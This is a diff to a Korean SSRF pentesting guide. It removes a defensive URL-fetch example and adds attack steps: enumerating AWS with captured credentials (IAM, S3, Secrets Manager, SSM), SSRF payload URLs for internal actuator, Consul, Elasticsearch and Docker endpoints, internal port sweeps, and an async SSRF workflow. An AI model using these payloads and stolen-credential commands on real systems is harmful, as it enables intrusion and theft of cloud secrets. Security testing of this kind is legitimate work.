-import socket, ipaddress
-from urllib.parse import urlparse
-import requests
-
-ALLOWED_DOMAINS = {"img.example.com", "cdn.example.com"}
-
-def safe_fetch(user_url: str) -> str:
-    parsed = urlparse(user_url)
-
-    if parsed.scheme not in {"http", "https"}:
-        raise ValueError("scheme not allowed")
-    if parsed.hostname not in ALLOWED_DOMAINS:
-        raise ValueError("domain not allowed")
-
-    ip = socket.gethostbyname(parsed.hostname)
-    addr = ipaddress.ip_address(ip)
-    if any([addr.is_private, addr.is_loopback, addr.is_link_local,
-            addr.is_multicast, addr.is_reserved]):
-        raise ValueError("internal IP not allowed")
-
-    # 검증한 IP로 직접 연결 + Host 헤더 명시 (DNS Rebinding 방지)
-    return requests.get(
-        f"{parsed.scheme}://{ip}{parsed.path or '/'}",
-        headers={"Host": parsed.hostname},
-        allow_redirects=False,
-        timeout=5,
-    ).text
+```bash
+AWS_ACCESS_KEY_ID=<AccessKeyId> \
+AWS_SECRET_ACCESS_KEY=<SecretAccessKey> \
+AWS_SESSION_TOKEN=<Token> \
+aws sts get-caller-identity
 ```
+
+권한 범위는 읽기 중심으로 좁혀서 본다.
+
+```bash
+aws iam get-user
+aws s3 ls
+aws s3 ls s3://<BUCKET> --max-items 10
+aws secretsmanager list-secrets --max-items 10
+aws ssm describe-parameters --max-results 10
+```
+
+GCP/Azure token도 caller identity, subscription/project 정보, 제한된 resource list를 먼저 본다.
+
+### 내부 서비스 영향 확인
+
+응답이 보이는 SSRF는 내부 서비스에서 민감 endpoint를 직접 확인한다.
+
+```text
+http://127.0.0.1:8080/actuator/env
+http://127.0.0.1:8080/actuator/configprops
+http://127.0.0.1:9200/_cluster/health
+http://127.0.0.1:8500/v1/kv/?recurse
+http://127.0.0.1:2375/version
+```
+
+Blind SSRF는 포트별 timeout/status 차이로 내부 서비스 지도를 만든다.
+
+```text
+http://10.0.0.10:22/
+http://10.0.0.10:80/
+http://10.0.0.10:443/
+http://10.0.0.10:8080/
+http://10.0.0.10:9200/
+```
+
+### Stored / Async SSRF
+
+웹훅, 이미지 URL, PDF 렌더링처럼 저장 후 처리되는 기능은 트리거 시점을 따라간다.
+
+```text
+1. URL 저장
+2. 미리보기/검증/배치 실행 시점 확인
+3. Collaborator hit 시간 확인
+4. 내부 URL로 바꿔 재처리
+5. 응답/로그/상태 변화 확인
+```
+
+Async 경로는 즉시 응답이 같아도 취약할 수 있다. unique marker를 매번 바꿔 어떤 기능이 언제 요청을 보냈는지 분리한다.
 
 ---
 
